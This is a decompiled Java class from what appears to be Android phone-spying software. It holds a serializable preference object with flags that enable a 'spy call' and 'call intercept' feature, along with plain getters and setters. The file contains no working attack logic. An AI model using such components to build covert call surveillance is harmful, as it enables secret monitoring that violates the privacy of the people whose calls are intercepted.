package com.vvt.preference;

import java.io.Serializable;

public class PrefSpyCall
  extends a
  implements Serializable
{
  private static final long serialVersionUID = 3153069897594130541L;
  private boolean isCallInterceptEnabled;
  private boolean isSpyCallEnabled;
  
  public FxPreferenceType getType()
  {
    return FxPreferenceType.SPY_CALL;
  }
  
  public boolean isCallInterceptEnabled()
  {
    return this.isCallInterceptEnabled;
  }
  
  public boolean isSpyCallEnabled()
  {
    return this.isSpyCallEnabled;
  }
  
  public void setCallInterceptEnabled(boolean paramBoolean)
  {
    this.isCallInterceptEnabled = paramBoolean;
  }
  
  public void setSpyCallEnabled(boolean paramBoolean)
  {
    this.isSpyCallEnabled = paramBoolean;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/preference/PrefSpyCall.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */